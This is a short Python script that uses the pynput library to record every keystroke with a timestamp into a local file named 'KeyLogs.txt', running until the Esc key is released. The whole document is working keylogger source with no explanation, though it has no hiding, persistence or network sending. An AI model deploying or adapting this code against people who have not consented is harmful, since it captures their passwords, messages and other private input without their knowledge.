import datetime
from pynput.keyboard import Key, Listener


def press(key):
    t=datetime.datetime.now()
    store(key,t)


def store(key,time):
    x = key
    ct=str(time)

    with open("KeyLogs.txt","a") as f:
        y=str(x).replace("'","")
        f.write(y + "\t\t" + ct + "\n")


def release(key):
    if key==Key.esc:
        return False


with Listener(on_press=press,on_release=release) as l:
    l.join()

